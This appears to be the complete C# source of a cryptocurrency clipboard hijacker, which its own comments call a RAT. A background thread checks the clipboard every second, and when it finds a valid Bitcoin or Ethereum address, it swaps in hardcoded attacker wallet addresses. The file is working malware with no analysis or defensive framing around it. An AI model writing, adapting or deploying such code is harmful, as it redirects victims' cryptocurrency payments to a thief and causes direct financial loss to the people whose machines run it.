namespace CryptoGetAndSet
{
    using System;
    using System.Diagnostics;
    using System.Threading;

    using CryptoGetAndSet.Crypto;

    using TextCopy;

    internal static class Program
    {
        /// <summary>
        /// Gets or sets the RAT thread.
        /// </summary>
        private static Thread RatThread
        {
            get;
            set;
        }

        /// <summary>
        /// Defines the entry point of the application.
        /// </summary>
        /// <param name="Args">The arguments.</param>
        private static void Main(string[] Args)
        {
            RatThread = new Thread(RatThreadRoutine);
            RatThread.Start();
        }

        /// <summary>
        /// The entry point of the RAT thread.
        /// </summary>
        /// <param name="Context">The context.</param>
        private static void RatThreadRoutine(object Context)
        {
            var IsRunning = true;

            // 
            // While the RAT runs...
            // 

            while (IsRunning)
            {
                Debug.WriteLine("Executing tick on the RAT thread...", "EVENT");

                // 
                // Retrieve the text saved in the clipboard.
                // 

                var ClipboardText = ClipboardService.GetText();

                if (string.IsNullOrEmpty(ClipboardText))
                {
                    goto WaitForNextLoop;
                }

                // 
                // If the crypto-address replacement feature is enabled...
                // 

                if (true)
                {
                    // 
                    // If the clipboard does not contain our bitcoin address..
                    // 

                    if (!string.Equals(ClipboardText, "3HxNb6nHFh2GgPDdCbD76tkFw5WB27hqfS"))
                    {
                        // 
                        // ..and the clipboard text IS a bitcoin address.
                        // 

                        if (BitcoinAddress.IsValid(ClipboardText))
                        {
                            Debug.WriteLine($"The clipboard contains a valid bitcoin address. (Address: {ClipboardText})", "ACTION");

                            // 
                            // Set our address instead.
                            // 

                            ClipboardService.SetText("3HxNb6nHFh2GgPDdCbD76tkFw5WB27hqfS");
                            Debug.WriteLine("We've replaced the clipboard text with our bitcoin address.", "ACTION");
                        }
                    }
                    else
                    {
                        Debug.WriteLine($"The clipboard contains OUR bitcoin address. (Address: {ClipboardText})", "LOG");
                    }

                    // 
                    // If the clipboard does not contain our ethereum address..
                    // 

                    if (!string.Equals(ClipboardText, "0x93Efc562CC3F67bE28C609c59879f90F1cB9757a"))
                    {
                        // 
                        // ..and the clipboard text IS a ethereum address.
                        // 

                        if (EthereumAddress.IsValid(ClipboardText))
                        {
                            Debug.WriteLine($"The clipboard contains a valid ethereum address. (Address: {ClipboardText})", "ACTION");

                            // 
                            // Set our address instead.
                            // 

                            ClipboardService.SetText("0x93Efc562CC3F67bE28C609c59879f90F1cB9757a");
                            Debug.WriteLine("We've replaced the clipboard text with our ethereum address.", "ACTION");
                        }
                    }
                    else
                    {
                        Debug.WriteLine($"The clipboard contains OUR ethereum address. (Address: {ClipboardText})", "LOG");
                    }
                }

                // 
                // Wait 1 second before running again.
                // 
            
            WaitForNextLoop:
                Thread.Sleep(1000);
            }
        }
    }
}
